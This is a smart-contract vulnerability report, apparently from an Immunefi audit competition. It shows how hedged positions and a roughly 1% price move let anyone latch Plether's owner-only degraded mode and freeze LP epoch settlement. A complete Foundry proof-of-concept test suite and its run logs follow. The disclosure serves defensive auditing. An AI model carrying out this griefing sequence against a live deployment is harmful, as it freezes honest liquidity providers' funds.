# \#97826 [SC-High] Third party can latch owner-only degraded mode, freezing LP settlement

**Submitted on Nov 3rd 2026 at 13:06:46 UTC by @SaiyanVegeta for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97826
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`CfdEngine.degradedMode` is a sticky, owner-only latch. It flips to `true` whenever a position-closing operation leaves the pool's raw cash E below the gross maximum-profit liability of the larger book side L, and nothing but an owner `clearDegradedMode()` call ever flips it back. While it is set, every `HousePool.settleLpEpoch` reverts `HousePool__DegradedMode`, so all matured LP redemptions and all matured LP deposits are frozen.

A single entity can arm and pull this trigger with no privileged access. It opens a hedged long/short pair of two accounts and fills the book up to the open-admission bound E >= L + B, where the buffer B is only `settlementBufferBps = 25` bps of L. Because that buffer is thin, it then waits for an ordinary market move of about 1% — in either direction — and closes the winning leg. The winning close pays out more than the buffer, E drops below L, and `degradedMode` latches. The honest LP whose redemption was queued before the attack cannot settle; recovery requires an owner transaction.

---

## Vulnerability Details

Verified at commit `a82d4fef`.

The latch. `CfdEngine.sol:1351-1369` (`_enterDegradedModeIfInsolvent`, reached from every close and liquidation apply path) compares raw cash against gross liability:

```solidity
uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
...
uint256 maxLiabilityAssets = _maxLiability();
if (effectiveAssetsAfter < maxLiabilityAssets) {
    degradedMode = true;
    emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
}
```

`E = _availableCashForFreshPoolPayouts()` is raw cash, `pool.totalAssets() − totalTraderClaimBalanceAssets` (`CfdEngine.sol:865-871`); `L = _maxLiability()` is the gross max-profit of the larger side (`CfdEngine.sol:1044-1050`).

The admission buffer is thin. `SECURITY.md:935` — opening requires a base reserve of C + L + B, where B defaults to `settlementBufferBps = 25` bps. On a book filled to that bound, E − L is roughly B. Measured at the bound: `E = 702,000.356343` USDC, `L = 700,000` USDC, so `E − L = 2,000.36` against `B = 1,750` (= 25 bps of L). A full close of the winning LONG leg at a −1% mark then gives `E = 698,698.133681 < L`, and the latch fires. The auditor's harness threshold sweep (an additional measurement) confirms the ~1% knee in both directions: no latch at 30/50/75 bps, latch at 100 bps, down and up alike.

Only the owner can clear it, and it is sticky. `degradedMode = false` is written in exactly one place, `clearDegradedMode()` (`CfdEngine.sol:658-667`), which is `onlyOwner` and refuses while E < L:

```solidity
function clearDegradedMode() external onlyOwner {
    if (!degradedMode) {
        revert CfdEngine__NotDegraded();
    }
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) {
        revert CfdEngine__StillInsolvent();
    }
    degradedMode = false;
    emit DegradedModeCleared();
}
```

The latch is durable, not transitory: it does not lift when E recovers and it does not lift when the attacker's book goes flat. In PoC 2 the attacker closes the other leg so L = 0 and `E = 706,588.101434` (solvent by any measure), yet `degradedMode` stays `true` and `settleLpEpoch` keeps reverting until the owner intervenes.

The settlement guard. `HousePool.sol:832` runs `_requireWithdrawalsLive(statusSnapshot)` inside `_settleLpEpoch`, and `HousePool.sol:1864-1869` reverts on the flag, blocking every `settleLpEpoch` — both matured redemptions and matured deposits:

```solidity
function _requireWithdrawalsLive(... statusSnapshot) internal pure {
    if (statusSnapshot.degradedMode) {
        revert HousePool__DegradedMode();
    }
}
```

Distinction from the documented firewall. `SECURITY.md:942` documents an intended "solvent but unavailable" region `L <= E < L + B`: it withholds new risk and LP redemption *funding* only, still lets matured deposits settle, and self-lifts permissionlessly once E >= L + B returns. That firewall is transient and permissionless. The defect reported here is the separate `degradedMode` latch at E < L: it blocks *all* `settleLpEpoch`, persists with a flat, solvent book, and lifts only through an owner transaction. In the partial-close variant (PoC 3) the E < L test is additionally too coarse: it ignores the margin pledged by the positions that remain open, so it latches a pool whose open accounts are collectible for more than the shortfall (gap L − E = 4,024.49, remaining collectible 19,385.29) — but that refinement matters only for that scenario; the full-close and flat-book cases latch and persist on raw cash alone.

This root cause is not described in any of the four Known-Issues sections of `SECURITY.md`, nor in any of the listed prior audits (Cecuro, pre-audit, collaborative, Cantina, AI scan): none covers a third party latching a durable owner-only state on an economically solvent pool.

---

## Impact Details

While the latch is set, the only exit for matured LP capital — `settleLpEpoch` — reverts `HousePool__DegradedMode`, so all matured LP redemptions and all matured LP deposits (USDG held in escrow) are frozen. This is griefing in the program's sense: the attacker has no profit motive (below) and the damage falls on every LP and on the protocol's owner. The freeze also meets Temporary freezing of funds for at least 1 hour: the PoC asserts the freeze at +1 h and again past 24 h, measured against `vm.getBlockTimestamp()`. A matured second-LP Junior deposit cannot even be cancelled while frozen (`cancelPendingDeposit` reverts `TrancheVault__DepositEpochAlreadyActive`), and the losing leg is not liquidatable by a third party at the same mark.

The attacker extracts none of the frozen funds: the hedged pair's net PnL is ≈ 0 and it pays opening/closing fees and carry. This is denial of settlement, not theft; closes, liquidations and already-funded claims stay live, and only LP epoch settlement is frozen. The move is an ordinary market move of the size the attacker chooses to wait for — not oracle manipulation.

The honest ceiling is Medium; the floor is the Low clause, since matured LP redemptions and deposits are not delivered at the epoch while no value is lost. The freeze is not unbounded by code: the owner can end it by injecting L − E through `recapitalizePool` and calling `clearDegradedMode` (measured minimum 1,302.866319 USDC at the fixture scale), and once the attacker's book is flat the owner can clear it for free.

The duration therefore depends on how quickly the owner acts (runbook `SECURITY.md:1505-1511`), which is why High ("at least 24 hours") is not claimed.

As an additional auditor measurement, under a minimum recap the attacker can re-latch by closing another slice — 8 consecutive cycles observed, with the owner injecting 6,011.83 USDC in total before over-injecting to buy headroom above L ends the loop.

All dollar figures are at the Foundry fixture scale (pool E ≈ 702,000 USDC); the mechanism and the bps thresholds transfer directly to the deployed Arbitrum Sepolia test deployment (~102M USDG pool, same RELEASE `riskParams`), but the absolute amounts do not.

---

## Recommendation

1. Make the latch recover permissionlessly (or automatically) as soon as E >= L returns, with a hysteresis band, instead of an owner-only clear. This removes the transition from a transient, permissionless firewall to a durable, permissioned freeze.
2. Prevent one entity from opening a hedged book up to the admission bound E >= L + B, or widen B to cover a realistic single-step basket move, so that a single winning close cannot cross from E >= L + B straight to E < L.
3. For the partial-close variant only, consider crediting the collectible margin of still-open positions when deciding insolvency, so an economically solvent book is not latched on a raw-cash artefact. (This is a refinement of the metric, not a substitute for fixes 1 and 2.)

---

## Proof of Concept

## Proof of Concept

All testing is local Foundry (forge 1.5.1, solc 0.8.35, via-IR), against the project's own in-scope contracts — no mainnet, no public testnet. The test inherits the project's own `test/perps/BasePerpTest.sol` fixture, which deploys the real `CfdEngine`, `HousePool`, `MarginClearinghouse` and both `TrancheVault` instances; only `MockSettlementToken` (USDG) and `MockPyth` are mocked (both out of scope). `setUp()` applies the deployed RELEASE `riskParams` (`initMarginBps 20, maintMarginBps 10, fadMarginBps 300, minBountyAssets 1e6, vpiFactor 1e16`) and asserts them together with `settlementBufferBps == 25` and `engineMarkStalenessLimit == 60`; the balanced start is Junior 500k (the victim LP) and Senior 200k. The test contract is the engine owner, so owner paths are driven directly.

PoC 1 (`test_causal_latch_vs_twin`) is the core claim: the victim's matured redemption is frozen *by the latch*, not by the documented firewall. Two twin branches use the same hedged book and the same victim and end in the same economic state (attacker flat, E >= L + B, firewall released): branch B closes the winning leg at −0.75% (no latch) and, once the book is flat, `settleLpEpoch` succeeds and the victim's `pendingRedeemRequest` goes to 0 with `claimableRedeemRequest > 0`; branch A closes at −1% (latch) and, in the identical flat state, `settleLpEpoch` reverts `HousePool__DegradedMode` and the victim's pending redemption is unchanged. The remaining tests cover the freeze past 1 h/24 h, persistence with a flat book, the economically-solvent partial close, the owner-pays recovery, and the mark-move-only control.

### Test file — `test/perps/W2DegradedLatch.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Port of the auditor's medusa-harness W2 PoC (PletherMedusaHarness.sol / W2Causal.t.sol) onto the
///         project's own `BasePerpTest` fixture, so a triager can replay it from a clean checkout without the
///         external harness. The deployed RELEASE risk parameters are applied and asserted in setUp.
///
///         Entity = two accounts of one owner: a LONG (`attackerLong`) and a SHORT (`attackerShort`) that hedge
///         each other. Victim = `victim`, an honest Junior LP (500k) with a matured redemption. `lp1` is an honest
///         Senior LP (200k) that also parks a matured Junior deposit. All LP settlement runs through the production
///         authorization split (`pool.settleLpEpoch` from the configured router with the exact live mark).
contract W2DegradedLatchTest is BasePerpTest {

    uint256 constant QUANTUM = 1e20; // one lot
    uint256 constant ENTRY = 1e8; // $1.00 open mark
    uint256 constant DOWN_1PCT = 0.99e8;
    uint256 constant DOWN_075PCT = 0.9925e8;
    uint256 constant DOWN_2PCT = 0.98e8;

    address constant attackerLong = address(0xA11);
    address constant attackerShort = address(0xA22);
    address constant victim = address(0xB0B);
    address constant lp1 = address(0xB22);
    address constant outsider = address(0xDEAD);

    bytes4 constant HP_DEGRADED = IHousePool.HousePool__DegradedMode.selector;

    // --- deployed RELEASE configuration (deployed-recon/snapshot.txt riskParams()) ---
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 1e16,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // only the honest LPs below provide tranche capital
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // balanced RELEASE start: Junior 500k (victim), Senior 200k (lp1)
        _fundJunior(victim, 500_000e6);
        _fundSenior(lp1, 200_000e6);

        (uint256 vpi,, uint256 maint, uint256 init, uint256 fad,, uint256 minBounty,,,) = engine.riskParams();
        assertEq(init, 20, "initMarginBps");
        assertEq(maint, 10, "maintMarginBps");
        assertEq(fad, 300, "fadMarginBps");
        assertEq(minBounty, 1e6, "minBountyAssets");
        assertEq(vpi, 1e16, "vpiFactor");
        assertEq(engine.settlementBufferBps(), 25, "settlementBufferBps");
        assertEq(engine.engineMarkStalenessLimit(), 60, "engineMarkStalenessLimit");
    }

    // ---------------------------------------------------------------------------------------------
    // helpers
    // ---------------------------------------------------------------------------------------------

    function _E() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    /// Collectible of a single account: pledged margin + claim, capped at the terminal-domain maximum.
    function _collectible(address a) internal view returns (uint256) {
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(a);
        if (size == 0) return 0;
        uint256 lots = size / QUANTUM;
        uint256 entry = engine.positionEntryCostAssetAtoms(a);
        uint256 maxColl = side == CfdTypes.Side.LONG ? lots * CAP_PRICE - entry : entry;
        uint256 cap = clearinghouse.pnlPledgeAssets(a) + engine.traderClaimBalanceAssets(a);
        return cap < maxColl ? cap : maxColl;
    }

    /// Single try-wrapped open so the fill loop can detect the admission gate as a revert.
    function tryOpen(address a, CfdTypes.Side side, uint256 size) external returns (bool) {
        require(msg.sender == address(this), "self");
        _ensureLaterOracleTime();
        _open(a, side, size, 2_000e6, ENTRY);
        return true;
    }

    /// Fill the hedged book, skew-neutral, up to the open-admission bound E >= L + B.
    function _fillToAdmissionBound() internal {
        _fundTrader(attackerLong, 60_000e6);
        _fundTrader(attackerShort, 60_000e6);
        uint16[5] memory steps = [2000, 500, 100, 20, 10];
        for (uint256 i; i < steps.length; ++i) {
            uint256 size = uint256(steps[i]) * QUANTUM;
            while (true) {
                bool okL;
                try this.tryOpen(attackerLong, CfdTypes.Side.LONG, size) {
                    okL = true;
                } catch {}
                bool okS;
                try this.tryOpen(attackerShort, CfdTypes.Side.SHORT, size) {
                    okS = true;
                } catch {}
                if (!okL || !okS) break;
            }
        }
    }

    function _refreshMark(uint256 price) internal {
        _ensureLaterOracleTime();
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(vm.getBlockTimestamp()));
    }

    /// Close `fracBps` of an account's position at `price` (updating the mark to `price` first).
    function _closeLeg(address a, uint256 fracBps, uint256 price) internal {
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(a);
        uint256 closeSize = (size * fracBps) / 10_000 / QUANTUM * QUANTUM;
        if (closeSize == 0) closeSize = size;
        _refreshMark(price);
        _close(a, side, closeSize, price);
    }

    /// Settle matured LP epochs through the router with the exact live mark (production authorization split).
    function _settle() internal returns (bool ok, bytes4 sel) {
        uint256 mark = engine.lastMarkPrice(); // cache before prank (arg evaluation would consume it)
        uint64 markTime = engine.lastMarkTime();
        vm.prank(address(router));
        try pool.settleLpEpoch(mark, markTime) {
            ok = true;
        } catch (bytes memory r) {
            if (r.length >= 4) sel = bytes4(r);
        }
    }

    /// Queue the victim's matured Junior redemption and lp1's matured Junior deposit, mature them, then fill the
    /// hedged book to the admission bound. Returns the victim redeem id and lp1 deposit id.
    function _arm(uint256 redeemDivisor) internal returns (uint256 vRid, uint256 depRid) {
        uint256 shares = juniorVault.maxRequestRedeem(victim) / redeemDivisor;
        vm.prank(victim);
        vRid = juniorVault.requestRedeem(shares, victim, victim);

        settlementToken.mint(lp1, 50_000e6);
        vm.startPrank(lp1);
        settlementToken.approve(address(juniorVault), 50_000e6);
        depRid = juniorVault.requestDeposit(50_000e6, lp1, lp1);
        vm.stopPrank();

        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 2)); // mature both requests
        _fillToAdmissionBound();

        assertGe(_E(), _maxLiability(), "pool solvent before the attack");
        assertFalse(engine.degradedMode(), "not degraded before the attack");
        console2.log("admission bound: E", _E(), "L", _maxLiability());
    }

    // ---------------------------------------------------------------------------------------------
    // PoC 1 (causal): is the victim's matured redemption frozen BY THE LATCH, not by the firewall?
    // Both branches end in the SAME economic state (attacker flat, E >= L + B, firewall released).
    //   A: -1 % full close of LONG latches; attacker then closes SHORT -> flat, still degraded.
    //   B: -0.75 % full close of LONG (no latch); attacker then closes SHORT -> flat, not degraded.
    // ---------------------------------------------------------------------------------------------

    function _branch(uint256 closePrice, string memory tag)
        internal
        returns (uint256 pendBefore, uint256 pendAfter, bool latched, bool ok, bytes4 sel)
    {
        (uint256 vRid,) = _arm(20); // victim redeems 5 %
        pendBefore = juniorVault.pendingRedeemRequest(vRid, victim);

        _closeLeg(attackerLong, 10_000, closePrice); // close the winning LONG
        latched = engine.degradedMode();
        _closeLeg(attackerShort, 10_000, closePrice); // close the SHORT at the same mark -> flat book

        assertGe(_E(), _maxLiability(), "flat book: firewall released, E >= L");
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _refreshMark(closePrice);
        (ok, sel) = _settle();
        pendAfter = juniorVault.pendingRedeemRequest(vRid, victim);

        console2.log(tag);
        console2.log("  latched", latched, "settle ok", ok);
        console2.log("  victim pending redeem shares before", pendBefore, "after", pendAfter);
        console2.log("  victim claimable redeem shares", juniorVault.claimableRedeemRequest(vRid, victim));
    }

    function test_causal_latch_vs_twin() public {
        (uint256 aBefore, uint256 aAfter, bool aLatched, bool aOk, bytes4 aSel) = _branch(DOWN_1PCT, "A: -1 % (latch)");
        setUp(); // fresh fixture for the twin
        (uint256 bBefore, uint256 bAfter, bool bLatched, bool bOk,) = _branch(DOWN_075PCT, "B: -0.75 % (twin)");

        assertTrue(aLatched, "A: the 1 % close latches degradedMode");
        assertFalse(bLatched, "B: the 0.75 % close does not latch");

        // twin without the latch: once the book is flat the victim's matured redemption is funded
        assertTrue(bOk, "B: settle succeeds");
        assertLt(bAfter, bBefore, "B: victim redemption progressed");

        // with the latch: same flat book, same victim, settlement reverts DegradedMode and nothing moves
        assertFalse(aOk, "A: settle reverts");
        assertEq(aSel, HP_DEGRADED, "A: revert is HousePool__DegradedMode");
        assertEq(aAfter, aBefore, "A: victim redemption frozen by the latch");
    }

    // ---------------------------------------------------------------------------------------------
    // (1) full close of the winning leg latches; honest LP frozen at +1h and beyond 24h
    // ---------------------------------------------------------------------------------------------

    function test_latch_freezes_honest_LP_beyond_24h() public {
        (, uint256 depRid) = _arm(10); // victim redeems 10 %

        _closeLeg(attackerLong, 10_000, DOWN_1PCT); // ~1 % move, full close of the winning LONG
        assertTrue(engine.degradedMode(), "degradedMode latched by the close");
        assertLt(_E(), _maxLiability(), "raw E < L");
        uint256 tLatch = vm.getBlockTimestamp();
        console2.log("after close: E", _E(), "L", _maxLiability());

        // +1 h: settlement reverts HousePool__DegradedMode
        vm.warp(tLatch + 1 hours);
        _refreshMark(DOWN_1PCT);
        (bool ok1, bytes4 sel1) = _settle();
        assertFalse(ok1, "+1h settle reverts");
        assertEq(sel1, HP_DEGRADED, "+1h revert is HousePool__DegradedMode");

        // past 24 h (measured with vm.getBlockTimestamp): still frozen
        vm.warp(tLatch + 24 hours + 1);
        assertGe(vm.getBlockTimestamp(), tLatch + 24 hours, "24 h elapsed since the latch");
        _refreshMark(DOWN_1PCT);
        (bool ok24, bytes4 sel24) = _settle();
        assertFalse(ok24, "+24h settle reverts");
        assertEq(sel24, HP_DEGRADED, "+24h revert is HousePool__DegradedMode");
        assertTrue(engine.degradedMode(), "still degraded after 24 h");

        // a matured Junior deposit of another honest LP cannot be cancelled either
        assertLe(depRid, pool.currentLpEpoch(), "lp1 deposit matured");
        vm.prank(lp1);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(depRid, lp1, lp1);

        // the losing SHORT leg is not liquidatable at the same mark
        assertFalse(engineLens.previewLiquidation(attackerShort, DOWN_1PCT).liquidatable, "short not liquidatable");

        // only the owner can clear, and the owner cannot clear while insolvent
        vm.prank(outsider);
        vm.expectRevert(abi.encodeWithSignature("OwnableUnauthorizedAccount(address)", outsider));
        engine.clearDegradedMode();

        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode(); // owner == address(this)
    }

    // ---------------------------------------------------------------------------------------------
    // (2) persistence: attacker closes the other leg (flat book, L = 0, E >= L) -> still degraded
    // ---------------------------------------------------------------------------------------------

    function test_latch_persists_with_flat_book() public {
        _arm(10);
        _closeLeg(attackerLong, 10_000, DOWN_1PCT);
        assertTrue(engine.degradedMode(), "latched");

        _closeLeg(attackerShort, 10_000, DOWN_1PCT); // close the SHORT -> flat book
        (uint256 shortSize,,,,,,) = engine.positions(attackerShort);
        assertEq(shortSize, 0, "short closed");
        assertEq(_maxLiability(), 0, "flat book: L = 0");
        assertGe(_E(), _maxLiability(), "pool fully solvent, E >= L");
        console2.log("flat book: E", _E(), "L", _maxLiability());
        assertTrue(engine.degradedMode(), "latch persists with a solvent, flat book");

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _refreshMark(DOWN_1PCT);
        (bool ok, bytes4 sel) = _settle();
        assertFalse(ok, "LP settlement still blocked");
        assertEq(sel, HP_DEGRADED, "revert is HousePool__DegradedMode");

        // now that the book is flat the owner can clear for free (no funds needed): duration is owner-bounded
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner clears a flat, solvent book at no cost");
    }

    // ---------------------------------------------------------------------------------------------
    // (3) 50 % close at 2 % -> latch while the remaining LONG accounts' collectible covers the gap
    // ---------------------------------------------------------------------------------------------

    function test_partial_close_econ_solvent_latch() public {
        _arm(10);
        _closeLeg(attackerLong, 5_000, DOWN_2PCT); // half of the winning LONG at ~2 %
        assertTrue(engine.degradedMode(), "latched");

        uint256 e = _E();
        uint256 l = _maxLiability();
        uint256 gap = l > e ? l - e : 0;
        uint256 collectible = _collectible(attackerLong) + _collectible(attackerShort);
        console2.log("partial close: E", e, "L", l);
        console2.log("  raw gap (L - E)", gap, "remaining collectible", collectible);
        assertGt(gap, 0, "raw E < L (accounting insolvency)");
        assertGe(collectible, gap, "but open accounts' collectible covers the gap (economically solvent)");

        // still frozen past 24 h
        uint256 tLatch = vm.getBlockTimestamp();
        vm.warp(tLatch + 24 hours + 1);
        assertGe(vm.getBlockTimestamp(), tLatch + 24 hours, "24 h elapsed");
        _refreshMark(DOWN_2PCT);
        (bool ok, bytes4 sel) = _settle();
        assertFalse(ok, "+24h settle reverts");
        assertEq(sel, HP_DEGRADED, "+24h revert is HousePool__DegradedMode");
    }

    // ---------------------------------------------------------------------------------------------
    // (4) owner must inject L - E then clear
    // ---------------------------------------------------------------------------------------------

    function test_owner_recovers_only_by_paying() public {
        _arm(10);
        _closeLeg(attackerLong, 10_000, DOWN_1PCT);
        assertTrue(engine.degradedMode(), "latched");

        uint256 need = _maxLiability() - _E() + 1e6;
        settlementToken.mint(address(this), need);
        settlementToken.approve(address(engine), need);
        engine.recapitalizePool(need);
        engine.clearDegradedMode();

        assertFalse(engine.degradedMode(), "owner clears after injecting L - E");
        console2.log("owner had to inject (USDC 6dp)", need);
    }

    // ---------------------------------------------------------------------------------------------
    // (5) control: a 1 % mark move with no close never latches, and the honest LP settles
    // ---------------------------------------------------------------------------------------------

    function test_control_move_only_no_latch() public {
        _arm(10);
        _refreshMark(DOWN_1PCT); // 1 % move, no position change
        assertFalse(engine.degradedMode(), "a mark move alone never latches");

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _refreshMark(DOWN_1PCT);
        (bool ok, bytes4 sel) = _settle();
        console2.log("control settle ok", ok);
        assertTrue(sel != HP_DEGRADED, "no DegradedMode revert without a latch");
        assertTrue(ok, "honest LP settles its matured epoch");
    }

}
```

### Run output

```
Ran 6 tests for test/perps/W2DegradedLatch.t.sol:W2DegradedLatchTest
[PASS] test_causal_latch_vs_twin() (gas: 102931868)
Logs:
  admission bound: E 702000356343 L 700000000000
  A: -1 % (latch)
    latched true settle ok false
    victim pending redeem shares before 25000228302084 after 25000228302084
    victim claimable redeem shares 0
  admission bound: E 702000356343 L 700000000000
  B: -0.75 % (twin)
    latched false settle ok true
    victim pending redeem shares before 25000000000000 after 0
    victim claimable redeem shares 25000000000000

[PASS] test_control_move_only_no_latch() (gas: 7302358)
Logs:
  admission bound: E 702000356343 L 700000000000
  control settle ok true

[PASS] test_latch_freezes_honest_LP_beyond_24h() (gas: 7635578)
Logs:
  admission bound: E 702000356343 L 700000000000
  after close: E 698698133681 L 700000000000

[PASS] test_latch_persists_with_flat_book() (gas: 6965672)
Logs:
  admission bound: E 702000356343 L 700000000000
  flat book: E 706588101434 L 0

[PASS] test_owner_recovers_only_by_paying() (gas: 6755280)
Logs:
  admission bound: E 702000356343 L 700000000000
  owner had to inject (USDC 6dp) 1302866319

[PASS] test_partial_close_econ_solvent_latch() (gas: 7454283)
Logs:
  admission bound: E 702000356343 L 700000000000
  partial close: E 695975513917 L 700000000000
    raw gap (L - E) 4024486083 remaining collectible 19385291979

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 100.31ms (152.66ms CPU time)
```

### Reproduction (from a clean checkout at `a82d4fef`, in `packages/perps`)

```
forge test --match-path test/perps/W2DegradedLatch.t.sol -vv
```

As additional measurements, the auditor also ran the original medusa harness (`medusa-copy-2/.../PletherMedusaHarness.sol`): a threshold sweep in both directions (no latch at 30/50/75 bps, latch at 100 bps) and an 8-cycle owner re-latch under minimum recap (owner injecting 6,011.83 USDC in total). All figures in this report are taken from the run logs.

